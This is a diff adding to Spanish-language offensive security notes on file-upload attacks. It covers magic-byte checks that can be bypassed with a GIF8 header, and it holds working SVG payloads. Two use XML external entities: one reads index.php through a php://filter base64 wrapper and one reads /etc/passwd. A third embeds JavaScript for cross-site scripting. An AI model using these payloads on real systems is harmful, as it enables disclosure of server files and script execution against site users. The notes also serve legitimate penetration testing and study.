@@ -43,6 +43,33 @@ Content-Type: image/jpg
 Funciona similar al anterior pero se controla los primeros bytes del contenido del archivo.
 https://en.wikipedia.org/wiki/List_of_file_signatures
 https://opensource.apple.com/source/file/file-23/file/magic/magic.mime
+https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5
 Como se puede ver, lo mas facil es usar GIF puesto que lo que utiliza en el contenido es tan solo la palabra GIF87a o GIF89a dando como resultado que se pueda poner solo GIF8 para que el contenido sea validado.
 
+	### Limited file uploads
+En algunos casos, el upload puede estar bien implementado impidiendo que lo anterior sirva. Hay otras formas de realizar un file upload
 
+[!]
+Para mas info ver txt de cross site scripting
+[!]
+
+## XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+#Creando un archivo .svg con el contenido de arriba, se esta solicitando que se muestre encodeado en base64 un archivo mediante un php grapper.
+#Este base64 se deberia mostrar en el codigo de la pagina en el caso de que la imagen sea mostrada (ej. foto de perfil)
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+#Otra opcin tambien es no encodearlo a ver si devuelve algo legible
+
+## XSS
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert("window.origin");</script>
+</svg>
+#La idea es igual que lo anterior
